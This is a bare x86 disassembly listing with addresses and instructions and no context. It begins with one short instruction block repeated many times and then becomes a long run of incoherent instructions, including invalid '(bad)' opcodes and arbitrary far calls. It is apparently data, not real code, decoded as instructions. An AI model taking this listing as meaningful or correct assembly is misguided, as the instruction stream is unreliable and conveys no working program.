  4231a5:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4231ac:	pop    ecx
  4231ad:	inc    esp
  4231ae:	push   0xffffffa5
  4231b0:	out    0x67,al
  4231b2:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4231b9:	pop    ecx
  4231ba:	inc    esp
  4231bb:	push   0xffffffa5
  4231bd:	out    0x67,al
  4231bf:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4231c6:	pop    ecx
  4231c7:	inc    esp
  4231c8:	push   0xffffffa5
  4231ca:	out    0x67,al
  4231cc:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4231d3:	pop    ecx
  4231d4:	inc    esp
  4231d5:	push   0xffffffa5
  4231d7:	out    0x67,al
  4231d9:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4231e0:	pop    ecx
  4231e1:	inc    esp
  4231e2:	push   0xffffffa5
  4231e4:	out    0x67,al
  4231e6:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4231ed:	pop    ecx
  4231ee:	inc    esp
  4231ef:	push   0xffffffa5
  4231f1:	out    0x67,al
  4231f3:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4231fa:	pop    ecx
  4231fb:	inc    esp
  4231fc:	push   0xffffffa5
  4231fe:	out    0x67,al
  423200:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  423207:	pop    ecx
  423208:	inc    esp
  423209:	push   0xffffffa5
  42320b:	out    0x67,al
  42320d:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  423214:	pop    ecx
  423215:	inc    esp
  423216:	push   0xffffffa5
  423218:	out    0x67,al
  42321a:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  423221:	pop    ecx
  423222:	inc    esp
  423223:	push   0xffffffa5
  423225:	out    0x67,al
  423227:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  42322e:	pop    ecx
  42322f:	inc    esp
  423230:	push   0xffffffa5
  423232:	out    0x67,al
  423234:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  42323b:	pop    ecx
  42323c:	inc    esp
  42323d:	push   0xffffffa5
  42323f:	out    0x67,al
  423241:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  423248:	pop    ecx
  423249:	inc    esp
  42324a:	push   0xffffffa5
  42324c:	out    0x67,al
  42324e:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  423255:	pop    ecx
  423256:	inc    esp
  423257:	push   0xffffffa5
  423259:	out    0x67,al
  42325b:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  423262:	pop    ecx
  423263:	inc    esp
  423264:	push   0xffffffa5
  423266:	out    0x67,al
  423268:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  42326f:	pop    ecx
  423270:	inc    esp
  423271:	push   0xffffffa5
  423273:	out    0x67,al
  423275:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  42327c:	pop    ecx
  42327d:	inc    esp
  42327e:	push   0xffffffa5
  423280:	out    0x67,al
  423282:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  423289:	pop    ecx
  42328a:	inc    esp
  42328b:	push   0xffffffa5
  42328d:	out    0x67,al
  42328f:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  423296:	pop    ecx
  423297:	inc    esp
  423298:	push   0xffffffa5
  42329a:	out    0x67,al
  42329c:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4232a3:	pop    ecx
  4232a4:	inc    esp
  4232a5:	push   0xffffffa5
  4232a7:	out    0x67,al
  4232a9:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4232b0:	pop    ecx
  4232b1:	inc    esp
  4232b2:	push   0xffffffa5
  4232b4:	out    0x67,al
  4232b6:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4232bd:	pop    ecx
  4232be:	inc    esp
  4232bf:	push   0xffffffa5
  4232c1:	out    0x67,al
  4232c3:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4232ca:	pop    ecx
  4232cb:	inc    esp
  4232cc:	push   0xffffffa5
  4232ce:	out    0x67,al
  4232d0:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4232d7:	pop    ecx
  4232d8:	inc    esp
  4232d9:	push   0xffffffa5
  4232db:	out    0x67,al
  4232dd:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4232e4:	pop    ecx
  4232e5:	inc    esp
  4232e6:	push   0xffffffa5
  4232e8:	out    0x67,al
  4232ea:	shl    BYTE PTR [ebx*4-0x47bd2a08],cl
  4232f1:	pop    ecx
  4232f2:	inc    esp
  4232f3:	sub    eax,0xfd67ec4b
  4232f8:	xor    al,0x9d
  4232fa:	call   0xfbd475d4
  4232ff:	sahf   
  423300:	sbb    eax,ebx
  423302:	sbb    DWORD PTR [edx+0x4c],ecx
  423305:	mov    bl,0xcd
  423307:	adc    eax,0xedabaae3
  42330c:	ror    DWORD PTR [esp+edx*8],1
  42330f:	bound  edi,QWORD PTR ds:0xee2a85c1
  423315:	mov    eax,0x82d832a6
  42331a:	inc    esp
  42331b:	(bad)  
  42331c:	jbe    0x423376
  42331e:	jmp    0x423327
  423320:	ror    BYTE PTR [ecx-0x3e],cl
  423323:	pusha  
  423324:	mov    eax,0xf0e2e37e
  423329:	mov    bh,0xa
  42332b:	jnp    0x423333
  42332d:	mov    al,ds:0xd8f3c125
  423332:	dec    ecx
  423333:	pop    ds
  423334:	dec    esp
  423335:	mov    ah,0x9
  423337:	push   cs
  423338:	jae    0x423392
  42333a:	jp     0x42337e
  42333c:	stc    
  42333d:	test   DWORD PTR ds:0xd55cba0d,esi
  423343:	sub    edi,esi
  423345:	rcl    BYTE PTR [esp+edx*2-0x78c4bd04],1
  42334c:	inc    ebp
  42334d:	xor    DWORD PTR [edi+0x14],esi
  423350:	dec    eax
  423351:	mov    al,0x49
  423353:	in     al,dx
  423354:	fidiv  DWORD PTR [edx+0x35b50bd9]
  42335a:	(bad)  
  42335b:	loopne 0x423305
  42335d:	scas   al,BYTE PTR es:[edi]
  42335e:	cdq    
  42335f:	xor    al,0xc3
  423361:	mov    al,ds:0xe14b0f2
  423366:	call   0x912c:0x30c5aada
  42336d:	sar    BYTE PTR [edi+0x11],1
  423370:	add    eax,0x6f813b09
  423375:	retf   0xda1
  423378:	in     al,dx
  423379:	dec    esp
  42337a:	jo     0x4233fb
  42337c:	das    
  42337d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42337e:	popa   
  42337f:	mov    edi,0x84ba9774
  423384:	cmp    DWORD PTR ds:0x7bcc0a9a,0x19
  42338b:	add    DWORD PTR [edx+esi*4+0x46],ebp
  42338f:	cmp    BYTE PTR [edi+0x2c],0xa5
  423393:	sbb    BYTE PTR [ecx],0xbb
  423396:	mov    dh,0x63
  423398:	jns    0x42335f
  42339a:	mov    ebp,0xb620d587
  42339f:	stc    
  4233a0:	mov    cl,0x6
  4233a2:	mov    dh,0x49
  4233a4:	and    ch,BYTE PTR [ebp-0x665c5fbb]
  4233aa:	sub    ebp,DWORD PTR ds:0xf719ba3d
  4233b0:	cld    
  4233b1:	das    
  4233b2:	int3   
  4233b3:	(bad)  
  4233b4:	(bad)  
  4233b6:	push   eax
  4233b7:	cmp    edx,DWORD PTR [eax]
  4233b9:	outs   dx,BYTE PTR ds:[esi]
  4233ba:	push   esp
  4233bb:	popf   
  4233bc:	xchg   esp,eax
  4233bd:	sub    eax,0x891fe11b
  4233c2:	nop
  4233c3:	je     0x4233c5
  4233c5:	les    edi,FWORD PTR [ebp-0x335e10f6]
  4233cb:	out    0xae,eax
  4233cd:	fucomi st,st(1)
  4233cf:	sub    edi,DWORD PTR [ebx+0x47]
  4233d2:	sti    
  4233d3:	sbb    al,0x86
  4233d5:	loopne 0x4233a6
  4233d7:	imul   edi,eax,0xd30b81d2
  4233dd:	out    dx,al
  4233de:	outs   dx,BYTE PTR ds:[esi]
  4233df:	xor    eax,0xb67309c1
  4233e4:	mov    ds:0xab0a8646,eax
  4233e9:	in     al,dx
  4233ea:	fdivr  DWORD PTR [esi+0x5a]
  4233ed:	mov    DWORD PTR fs:[edi-0x32],edx
  4233f1:	inc    ebx
  4233f2:	rol    ebx,cl
  4233f4:	test   dh,0xdd
  4233f7:	or     DWORD PTR [ebx+0x1f5d649b],edi
  4233fd:	ss aaa 
  4233ff:	nop
  423400:	cwde   
  423401:	mov    bh,BYTE PTR [edi]
  423403:	add    ah,BYTE PTR ds:0xd4f0cd02
  423409:	ret    0x2f1c
  42340c:	dec    ebx
  42340d:	push   0x4068c829
  423412:	cmc    
  423413:	mov    ds:0x8adb4c5c,eax
  423418:	imul   edi,DWORD PTR [ebx],0x51
  42341b:	add    eax,0x53964699
  423420:	jnp    0x423425
  423422:	add    esi,edx
  423424:	ins    BYTE PTR es:[edi],dx
  423425:	pushf  
  423426:	int3   
  423427:	sti    
  423428:	push   ebp
  423429:	mov    al,ds:0xdf5d3801
  42342e:	sbb    al,0xcb
  423431:	mov    cl,0x8e
  423433:	in     eax,0x37
  423435:	push   edx
  423436:	mov    eax,0x25539f1d
  42343b:	mov    cl,0xd5
  42343d:	je     0x42340e
  42343f:	push   ecx
  423440:	mov    ebp,0x7855b6b2
  423445:	jg     0x423427
  423447:	dec    ebx
  423448:	mov    BYTE PTR [esi],dl
  42344a:	mov    eax,ds:0xbf26b34b
  42344f:	(bad)  
  423450:	push   DWORD PTR [ebp-0x2a30ad2c]
  423456:	adc    edx,DWORD PTR [eax+0xb]
  423459:	adc    eax,0xbc8eb376
  42345e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42345f:	shl    bh,cl
  423461:	outs   dx,BYTE PTR ds:[esi]
  423462:	or     BYTE PTR [ecx-0x51],ah
  423465:	jno    0x42345a
  423467:	addr16 sbb eax,0x9b57c5b5
  42346d:	xor    BYTE PTR [ecx-0x24],bh
  423470:	xor    al,0xc5
  423472:	pop    esp
  423473:	fsubr  DWORD PTR [ebx-0x21f8588a]
  423479:	push   esi
  42347a:	scas   eax,DWORD PTR es:[edi]
  42347b:	test   DWORD PTR [ebx+0x33],ecx
  42347e:	sahf   
  42347f:	xlat   BYTE PTR ds:[ebx]
  423480:	pushf  
  423481:	call   0xd6e6dbb7
  423486:	mov    al,0xe8
  423488:	cmp    al,0x19
  42348a:	sti    
  42348b:	lock iret 
  42348d:	ins    BYTE PTR es:[edi],dx
  42348e:	push   0xffffff9b
  423490:	(bad)  
  423492:	lea    ebx,[edx-0x3061ae3d]
  423498:	xlat   BYTE PTR ds:[ebx]
  423499:	pop    esp
  42349a:	inc    ebp
  42349b:	inc    edx
  42349c:	or     al,ah
  42349e:	icebp  
  42349f:	jb     0x423490
  4234a1:	inc    edx
  4234a2:	pop    esp
  4234a3:	jb     0x42350a
  4234a5:	daa    
  4234a6:	repz and DWORD PTR [edx+0x3f9610c7],eax
  4234ad:	or     eax,0xd92e689
  4234b2:	call   0xa857:0xb467d2f7
  4234b9:	popf   
  4234ba:	dec    eax
  4234bb:	sbb    edx,DWORD PTR [esi+0x3a8726c1]
  4234c1:	ss jnp 0x42352a
  4234c4:	je     0x423538
  4234c6:	iret   
  4234c7:	jbe    0x42350a
  4234c9:	cld    
  4234ca:	out    dx,eax
  4234cb:	movzx  esp,BYTE PTR [eax+0x1d0b22ca]
  4234d2:	push   eax
  4234d3:	pop    ebx
  4234d4:	rol    BYTE PTR [eax+edi*8+0x19],cl
  4234d8:	daa    
  4234d9:	push   0xeb5d0c2f
  4234de:	mov    dh,0x4d
  4234e0:	or     DWORD PTR [edx-0x179be10f],0x29
  4234e7:	xchg   esi,eax
  4234e8:	add    BYTE PTR [edx+0x2d],0xb7
  4234ec:	sbb    eax,0x8ab00c0a
  4234f1:	out    dx,eax
  4234f2:	and    eax,0x88249516
  4234f7:	jno    0x42353a
  4234f9:	iret   
  4234fa:	sub    dh,dl
  4234fc:	mov    ecx,0x2fe97026
  423501:	dec    ecx
  423502:	push   eax
  423503:	lds    ebp,FWORD PTR ds:0x3311f
  42350a:	and    eax,0x6219ccfb
  42350f:	aaa    
  423510:	imul   esp,DWORD PTR ss:[edi-0x8],0xffffffab
  423515:	add    BYTE PTR [esi],bl
  423517:	aaa    
  423518:	lahf   
  423519:	add    esp,DWORD PTR [edx]
  42351b:	push   ds
  42351c:	sbb    al,0x1e
  42351e:	mov    bl,0x18
  423520:	inc    edx
  423521:	push   eax
  423522:	push   es
  423523:	fsubr  DWORD PTR [edi+0x2a319831]
  423529:	inc    edx
  42352a:	mov    eax,0x1b1f4105
  42352f:	gs ins BYTE PTR es:[edi],dx
  423531:	jl     0x423594
  423533:	ret    
  423534:	dec    ebx
  423535:	icebp  
  423536:	pop    esp
  423537:	mov    ecx,0xee053a8a
  42353c:	mov    ds:0x812352be,eax
  423541:	test   ebx,edx
  423543:	adc    ecx,DWORD PTR [edi]
  423545:	and    eax,0xb7494f75
  42354a:	and    esp,ebp
  42354c:	jmp    0x42357d
  42354e:	pop    edx
  42354f:	iret   
  423550:	xor    edx,edi
  423552:	arpl   bp,ax
  423554:	fs and ebx,ebx
  423557:	inc    esi
  423558:	xchg   ebx,eax
  423559:	call   0x9f47:0x640d8c0c
  423560:	add    eax,0x67577850
  423565:	dec    edi
  423566:	xchg   BYTE PTR [edi],cl
  423568:	retf   0x3bf6
  42356b:	xor    BYTE PTR [edi+0x40dd65b9],0x9d
  423572:	mov    BYTE PTR [eax+0x1b76a7a2],al
  423578:	lds    edi,FWORD PTR [esi+0x7d]
  42357b:	je     0x42352b
  42357d:	adc    DWORD PTR [ebp-0x15],ecx
  423580:	jmp    DWORD PTR [ebp-0x2653fba4]
  423586:	imul   edi,edx,0x5f4379cf
  42358c:	sbb    eax,0x4060e3f2
  423591:	frstor [edi+edx*8-0x53820357]
  423598:	dec    ebx
  423599:	dec    al
  42359b:	adc    al,0xe8
  42359d:	add    al,0x76
  42359f:	xor    DWORD PTR [eax+0x5e5f8e3c],edi
  4235a5:	mov    cl,0x85
  4235a7:	ret    
  4235a8:	sub    DWORD PTR [edx-0x6bb17cf],ecx
  4235ae:	imul   edi,DWORD PTR [edx+esi*1-0x7588b98d],0xffffffd9
  4235b6:	pop    ds
  4235b7:	adc    eax,0xdfb0204e
  4235bc:	cmp    ebp,DWORD PTR [esi-0x3ce68f6]
  4235c2:	outs   dx,BYTE PTR ds:[esi]
  4235c3:	shl    BYTE PTR [edi+0x33e99d34],1
  4235c9:	jle    0x423611
  4235cb:	(bad)  
  4235cc:	loopne 0x423639
  4235ce:	xor    al,0x55
  4235d0:	lahf   
  4235d1:	fucom  st(3)
  4235d3:	ja     0x42358a
  4235d5:	mov    bh,0xd6
  4235d7:	sub    DWORD PTR [esi+0x5c],esi
  4235da:	inc    ebp
  4235db:	lahf   
  4235dc:	mov    edi,0x89086878
  4235e1:	xchg   ebp,eax
  4235e2:	je     0x4235e2
  4235e4:	int3   
  4235e5:	test   dl,ah
  4235e7:	sub    bl,BYTE PTR [ebx+0x7]
  4235ea:	jg     0x42359f
  4235ec:	imul   eax,DWORD PTR [esi+0x6e00ad18],0x1c6d0599
  4235f6:	pusha  
  4235f7:	xor    esp,edi
  4235f9:	push   esi
  4235fa:	jl     0x423630
  4235fc:	ds (bad) 
  4235fe:	sbb    eax,0x6adfcfe5
  423603:	push   ebx
  423604:	jmp    0x8f061ea8
  423609:	cmp    BYTE PTR [ecx-0x45f9ccd3],bh
  42360f:	in     eax,0xa9
  423611:	sbb    cl,dl
  423613:	pop    ss
  423614:	cld    
  423615:	cmc    
  423616:	test   dh,0x4
  423619:	adc    bl,BYTE PTR [esp+ebx*1]
  42361c:	and    dh,al
  42361e:	xor    al,0xf1
  423620:	jnp    0x4235fb
  423622:	mov    cl,0x10
  423624:	out    0x18,eax
  423626:	inc    esp
  423627:	sbb    DWORD PTR [edi+edi*8],0xffffff99
  42362b:	lods   al,BYTE PTR ds:[esi]
  42362c:	and    ecx,esp
  42362e:	and    esp,DWORD PTR [eax-0xd1e8642]
  423634:	push   ebp
  423635:	pop    ebp
  423636:	popa   
  423637:	jp     0x4235f4
  423639:	imul   esp,DWORD PTR [eax+0x68aba5f3],0x6a
  423640:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423641:	inc    edi
  423642:	xchg   ebx,eax
  423643:	inc    edi
  423644:	adc    ebp,esi
  423646:	into   
  423647:	pop    ecx
  423648:	loop   0x4236a5
  42364a:	mov    al,ds:0xb692bf82
  42364f:	jbe    0x4235fd
  423651:	xchg   DWORD PTR [ecx-0x7d],edi
  423654:	outs   dx,DWORD PTR ds:[esi]
  423655:	enter  0x3f8d,0x16
  423659:	enter  0x8e84,0x3d
  42365d:	cmc    
  42365e:	xor    esp,DWORD PTR ds:0x57fd4f8b
  423664:	data16 jecxz 0x423661
  423667:	loope  0x42363e
  423669:	inc    ebx
  42366a:	mov    edx,0xe0ab759c
  42366f:	push   edi
  423670:	mov    DWORD PTR [ebx],ecx
  423672:	and    eax,0x1ec4cea1
  423677:	push   es
  423678:	jle    0x423690
  42367a:	aam    0x25
  42367c:	adc    ebx,DWORD PTR [edi]
  42367e:	mov    eax,DWORD PTR [eax+0x744e2a61]
  423684:	cmp    dl,BYTE PTR [edx]
  423686:	add    BYTE PTR [ebx+0x12],0xfa
  42368a:	inc    esp
  42368b:	repnz push ebp
  42368d:	es test esp,esi
  423690:	data16 jo 0x42366f
  423693:	mov    ah,0xf3
  423695:	add    al,0x82
  423697:	dec    ecx
  423698:	push   eax
  423699:	pop    ecx
  42369a:	mov    eax,ds:0x571cebcf
  42369f:	shl    edx,cl
  4236a1:	sar    DWORD PTR [esi],1
  4236a3:	xor    bl,BYTE PTR [ebx+0x51bbeecd]
  4236a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236aa:	mov    esp,0xc21d9b35
  4236af:	or     esi,ebx
  4236b1:	sbb    ebx,DWORD PTR [edx]
  4236b3:	fisub  WORD PTR [edi-0x2]
  4236b6:	mov    ch,0xc6
  4236b8:	stos   BYTE PTR es:[edi],al
  4236b9:	sub    cl,bh
  4236bb:	shl    bh,1
  4236bd:	test   edx,ebx
  4236bf:	sub    DWORD PTR [eax-0x4bae6e57],edx
  4236c5:	xchg   edx,eax
  4236c6:	jmp    0xc62:0x2a338ea9
  4236cd:	nop
  4236ce:	out    dx,eax
  4236cf:	mov    ds:0xda2ff0f3,al
  4236d4:	xchg   edx,eax
  4236d5:	rcl    DWORD PTR [ebp+eax*1+0x31],cl
  4236d9:	repnz adc eax,0x3dfc16b9
  4236df:	xchg   edx,eax
  4236e0:	loopne 0x423730
  4236e2:	and    DWORD PTR [ecx],0xfffffffb
  4236e5:	adc    al,0x54
  4236e7:	dec    ebp
  4236e8:	fsub   QWORD PTR [edx+0x2d84d3d5]
  4236ee:	dec    edi
  4236ef:	arpl   WORD PTR [esi+0x14fd2bec],si
  4236f5:	hlt    
  4236f6:	jle    0x423739
  4236f8:	icebp  
  4236f9:	xchg   ecx,eax
  4236fa:	into   
  4236fb:	push   es
  4236fc:	cmp    DWORD PTR [edi+0x76],esp
  4236ff:	out    dx,eax
  423700:	std    
  423701:	rol    BYTE PTR [ebx+0x5f],cl
  423704:	push   0x3b799138
  423709:	stos   DWORD PTR es:[edi],eax
  42370a:	add    al,BYTE PTR [edx-0x39]
  42370d:	push   ds
  42370e:	sahf   
  42370f:	int    0x61
  423711:	xor    al,0xf7
  423713:	aaa    
  423714:	xchg   BYTE PTR [eax],al
  423716:	repz mov esp,0xcf333424
  42371c:	lods   eax,DWORD PTR ds:[esi]
  42371d:	test   BYTE PTR [ebx-0x7721a9ed],bl
  423723:	in     al,0xc4
  423725:	test   al,0x23
  423727:	pop    esi
  423728:	push   ebp
  423729:	(bad)  
  42372a:	ins    DWORD PTR es:[edi],dx
  42372b:	clc    
  42372c:	ficomp WORD PTR [ebx-0x5821350a]
  423732:	pop    esp
  423733:	fcmovu st,st(3)
  423735:	cmp    esi,DWORD PTR [esi+0x4573be41]
  42373b:	adc    BYTE PTR [ebx],bl
  42373d:	fiadd  DWORD PTR [ebp-0x14d8984f]
  423743:	std    
  423744:	sahf   
  423745:	jmp    FWORD PTR [eax]
  423747:	dec    esi
  423748:	aad    0xbc
  42374a:	fdivr  st,st(3)
  42374c:	gs (bad) 
  42374e:	pop    esp
  42374f:	xchg   edx,eax
  423750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423751:	lahf   
  423752:	pop    esi
  423753:	adc    DWORD PTR [edi+0x4a3ab3d9],esi
  423759:	imul   edx,DWORD PTR [ebx-0x2f1ffd92],0x53
  423760:	stc    
  423761:	in     eax,0xef
  423763:	cld    
  423764:	jmp    0x423786
  423766:	outs   dx,BYTE PTR ds:[esi]
  423767:	push   eax
  423768:	jp     0x4237c5
  42376a:	inc    esp
  42376b:	xor    ah,BYTE PTR ds:0x9d737060
  423771:	(bad)  
  423772:	xlat   BYTE PTR ds:[ebx]
  423773:	lods   al,BYTE PTR ds:[esi]
  423774:	add    eax,0xb45ff387
  423779:	enter  0x503b,0x19
  42377d:	sbb    al,0x20
  42377f:	adc    ecx,0xffffffe8
  423782:	mov    dh,BYTE PTR ds:0x6bb57edb
  423788:	out    dx,eax
  423789:	(bad)  
  42378a:	inc    BYTE PTR [eax-0x66bc7db9]
  423790:	out    0x64,eax
  423792:	hlt    
  423793:	push   es
  423794:	mov    ds:0x110f65a6,eax
  423799:	mov    WORD PTR [edx+0x4e],cs
  42379c:	jecxz  0x423805
  42379e:	cmp    BYTE PTR [esi],dh
  4237a0:	gs push eax
  4237a2:	loopne 0x4237a5
  4237a4:	jnp    0x4237be
  4237a6:	les    ebx,FWORD PTR [edi-0xf678b03]
  4237ac:	test   eax,0x9d156227
  4237b1:	shr    DWORD PTR [ebp-0x33f19c05],1
  4237b7:	lds    edi,FWORD PTR [esi]
  4237b9:	inc    esp
  4237ba:	ror    BYTE PTR [eax+0x52],1
  4237bd:	xchg   edx,eax
  4237be:	jl     0x423743
  4237c0:	mov    ah,0xc3
  4237c2:	outs   dx,BYTE PTR ds:[esi]
  4237c3:	loope  0x42379b
  4237c5:	mov    bh,0x7a
  4237c7:	adc    al,0xc1
  4237c9:	xlat   BYTE PTR ds:[ebx]
  4237ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237cb:	mov    bh,0x26
  4237cd:	popa   
  4237ce:	scas   eax,DWORD PTR es:[edi]
  4237cf:	push   ebp
  4237d0:	push   edx
  4237d1:	adc    al,0xa0
  4237d4:	jge    0x423852
  4237d6:	or     al,0x57
  4237d8:	and    DWORD PTR [edi-0x3f],edi
  4237db:	mov    eax,ds:0xe8d3da38
  4237e0:	jnp    0x423815
  4237e2:	sbb    BYTE PTR [esi-0x520e80e2],dl
  4237e8:	ss xchg ecx,eax
  4237ea:	icebp  
  4237eb:	fist   DWORD PTR [ecx]
  4237ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237ee:	or     al,0x2b
  4237f0:	jmp    0xef25e94a
  4237f5:	xor    eax,0x3552c0f9
  4237fa:	and    BYTE PTR [edx],dl
  4237fc:	inc    ebp
  4237fd:	push   edx
  4237fe:	dec    eax
  4237ff:	xor    DWORD PTR [edi-0x13e5a0f9],ebp
  423805:	xor    bh,BYTE PTR [esi]
  423807:	mov    DWORD PTR [ebp+ebx*8-0x616ebd73],ebp
  42380e:	fdiv   DWORD PTR [esp+ecx*1+0x39]
  423812:	icebp  
  423813:	or     esp,eax
  423815:	fild   QWORD PTR [eax-0x4dcbcd26]
  42381b:	nop
  42381c:	(bad)  
  42381e:	xchg   ecx,eax
  42381f:	fiadd  WORD PTR [esi]
  423821:	mov    ds:0x4ca712e3,al
  423826:	call   0x8b90d282
  42382b:	cmp    ch,0x9d
  42382e:	retf   0x9ddf
  423831:	mov    cl,0x30
  423833:	fwait
  423834:	out    dx,al
  423835:	sub    edi,DWORD PTR [ebp-0x2b34a7f3]
  42383b:	cld    
  42383c:	sub    DWORD PTR [ecx+0x38844228],0x57
  423843:	ins    DWORD PTR es:[edi],dx
  423844:	repz mov al,BYTE PTR [ecx-0x5592838c]
  42384b:	inc    ebx
  42384c:	lock jp 0x423806
  42384f:	jge    0x4238bf
  423851:	lds    ebp,FWORD PTR [esi+0x5ab0874c]
  423857:	push   ebx
  423858:	call   0xd90dbfcb
  42385d:	cmp    edx,ebx
  42385f:	cwde   
  423860:	hlt    
  423861:	inc    esi
  423862:	shl    DWORD PTR [ecx-0x2e5140fc],0x86
  423869:	jae    0x42387b
  42386b:	repnz call 0x2f48:0x28a1b934
  423873:	and    DWORD PTR [ebx],esi
  423875:	push   ds
  423876:	js     0x4238f6
  423878:	int    0x72
  42387a:	aad    0xdd
  42387c:	mov    ebx,0x1150d254
  423881:	xchg   esi,eax
  423882:	std    
  423883:	inc    edx
  423884:	adc    bh,BYTE PTR [esi]
  423886:	jb     0x423865
  423888:	push   ebp
  423889:	inc    esi
  42388a:	pop    ecx
  42388b:	aad    0xfd
  42388d:	cmp    BYTE PTR [esi],al
  42388f:	ret    
  423890:	dec    ecx
  423891:	int    0xca
  423893:	stos   BYTE PTR es:[edi],al
  423894:	mov    ds:0x9de95ef8,al
  423899:	enter  0xe34,0x9e
  42389d:	sahf   
  42389e:	mov    ebx,0x7356b967
  4238a3:	mov    esi,0x39e1c9a4
  4238a8:	(bad)  
  4238aa:	loopne 0x42390a
  4238ac:	mov    ds:0x482bbdbe,al
  4238b1:	addr16 lock jnp 0x42390e
  4238b5:	pop    ebx
  4238b6:	test   DWORD PTR [edi+esi*2],ebx
  4238b9:	mov    eax,ds:0xe98b7f02
  4238be:	sti    
  4238bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238c0:	gs push ebp
  4238c2:	push   ss
  4238c3:	or     esp,esp
  4238c5:	mov    al,ds:0x98cb9ae8
  4238ca:	or     eax,0x6aebd3a6
  4238cf:	and    DWORD PTR [edx+0x4832cc74],0x391ab449
  4238d9:	and    eax,0x1e1d971c
  4238de:	(bad)  
  4238df:	(bad)  
  4238e0:	repz push 0x8f1b1a77
  4238e6:	das    
  4238e7:	data16 jl 0x42387b
  4238ea:	lods   al,BYTE PTR ds:[esi]
  4238eb:	aaa    
  4238ec:	adc    eax,0x32e1f681
  4238f1:	mov    cl,0xd1
  4238f3:	retf   0x6b94
  4238f6:	sub    eax,0x3495d97e
  4238fb:	cmp    BYTE PTR [edi+0x4d0bc06e],dl
  423901:	mov    edx,0x4602d608
  423906:	xchg   ebp,eax
  423908:	cmp    DWORD PTR [edx+0x42],ebp
  42390b:	pop    ecx
  42390c:	mov    edx,0x6ebd7b2d
  423911:	jecxz  0x42390e
  423913:	ja     0x4238ca
  423915:	dec    ebp
  423916:	xor    eax,0x525fac3b
  42391b:	push   ecx
  42391c:	cwde   
  42391d:	or     BYTE PTR [esi-0x43fb4eac],0x3c
  423924:	mov    bl,0x9d
  423926:	push   edx
  423927:	sub    esp,DWORD PTR [edx+0x3546eed2]
  42392d:	sahf   
  42392e:	push   es
  42392f:	dec    ebp
  423930:	inc    ebx
  423931:	fcmove st,st(2)
  423933:	test   al,0xc6
  423935:	bswap  esp
  423937:	pop    edx
  423938:	dec    eax
  423939:	mov    ebp,DWORD PTR [ecx-0x3458a8f]
  42393f:	(bad)  
  423940:	fs fwait
  423942:	inc    eax
  423943:	mov    ds:0x1e4152f5,eax
  423948:	mov    ch,0xeb
  42394a:	inc    esi
  42394b:	mov    ds:0xed2119fa,al
  423950:	jne    0x423998
  423952:	push   0x9896c947
  423957:	push   ebx
  423958:	or     esi,esp
  42395a:	pop    ds
  42395b:	xchg   DWORD PTR [esi-0x4c],eax
  42395e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42395f:	mov    edi,0x86056ed6
  423964:	or     dl,BYTE PTR [eax]
  423966:	fucomip st,st(7)
  423968:	xchg   edi,eax
  423969:	popa   
  42396a:	test   BYTE PTR [ecx],bl
  42396c:	push   esi
  42396d:	stc    
  42396e:	bound  esp,QWORD PTR [eax]
  423970:	pop    ds
  423971:	out    dx,al
  423972:	scas   eax,DWORD PTR es:[edi]
  423973:	sub    ecx,esp
  423975:	(bad)  
  423976:	adc    DWORD PTR [edi-0xe1f3ea4],eax
  42397c:	sub    esp,0xffffff90
  42397f:	arpl   WORD PTR [edi+eiz*8],si
  423982:	inc    esp
  423983:	iret   
  423984:	ss fdiv st(4),st
  423987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423988:	imul   eax,DWORD PTR [eax],0xa4dd20d8
  42398e:	inc    ebx
  42398f:	mov    cl,0x64
  423991:	call   0x595e:0x836aebaa
  423998:	pop    ss
  423999:	mov    esi,0xd0c8d427
  42399e:	pop    esi
  42399f:	arpl   WORD PTR [edx-0x6907b0e2],ax
  4239a5:	mov    BYTE PTR [edx+0x55c62522],dl
  4239ab:	pusha  
  4239ac:	loop   0x4239ee
  4239ae:	scas   al,BYTE PTR es:[edi]
  4239af:	sti    
  4239b0:	inc    ebp
  4239b1:	adc    al,0x4b
  4239b3:	mul    DWORD PTR [ebx+0xdc4f63f]
  4239b9:	(bad)  
  4239ba:	jp     0x42394e
  4239bc:	cli    
  4239bd:	xchg   ecx,eax
  4239be:	lods   al,BYTE PTR ds:[esi]
  4239bf:	sub    dl,BYTE PTR [edx]
  4239c1:	adc    al,0xc2
  4239c3:	es jno 0x423980
  4239c6:	fsubr  DWORD PTR [ecx+ebp*4+0x48]
  4239ca:	mov    ch,0x2a
  4239cc:	jbe    0x42399b
  4239ce:	into   
  4239cf:	or     al,0x73
  4239d1:	xchg   DWORD PTR [ebp-0x2],eax
  4239d4:	pushf  
